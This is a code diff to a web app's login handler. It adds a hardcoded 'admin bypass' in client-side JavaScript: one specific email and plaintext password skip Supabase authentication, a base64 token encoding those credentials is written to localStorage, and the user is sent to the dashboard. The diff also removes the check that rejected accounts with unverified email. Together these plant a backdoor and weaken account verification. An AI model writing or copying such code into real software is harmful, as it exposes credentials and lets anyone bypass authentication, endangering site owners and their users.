@@ -1054,17 +1054,26 @@ const Landing = () => {
     setLoginError('');
     setLoginLoading(true);
     try {
+      // Admin bypass: email/password without Supabase verification
+      if ((formData.email || '').toLowerCase() === 'eduadminaccount@sonar.local' && formData.password === 'Rasca0404') {
+        try {
+          if (typeof window !== 'undefined') {
+            window.localStorage.setItem('adminLogin', 'ZWR1YWRtaW5hY2NvdW50OjpSYXNjYTA0MDQ=');
+          }
+        } catch {}
+        showToast('Admin login successful', 'success');
+        setShowLoginModal(false);
+        navigate('/dashboard');
+        return;
+      }
+
       const sb = supabaseBrowser();
       const { data, error } = await sb.auth.signInWithPassword({
         email: formData.email,
         password: formData.password,
       });
       if (error) throw error;
-      const user = data?.user;
-      if (user && !user.email_confirmed_at) {
-        await sb.auth.signOut();
-        throw new Error('Please verify your email before logging in.');
-      }
+      // Bypass email verification gating during login
       showToast('Welcome back!', 'success');
       setShowLoginModal(false);
       navigate('/dashboard');
